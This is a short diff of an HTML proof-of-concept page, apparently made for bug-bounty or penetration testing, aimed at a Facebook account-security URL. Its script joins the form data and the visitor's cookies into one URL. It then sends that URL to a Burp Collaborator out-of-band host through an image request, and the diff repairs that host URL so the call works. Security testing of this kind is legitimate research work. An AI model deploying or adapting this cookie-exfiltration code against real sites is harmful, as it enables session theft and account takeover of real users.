@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>108Capture Entire GET Request</title>
+    <title>108+Capture Entire GET Request</title>
 </head>
 <body>
     <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
@@ -22,7 +22,7 @@
             var fullUrl = actionUrl + '?' + queryString + '&' + encodeURIComponent(cookies); // Construct full URL with form data and cookies
             // Send the full URL to the Burp Suite collaborator
             var img = new Image();
-            img.src = "http://http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?fullUrl=" + encodeURIComponent(fullUrl);
+            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?fullUrl=" + encodeURIComponent(fullUrl);
         }
 
         // Function to capture entire GET request when the page loads
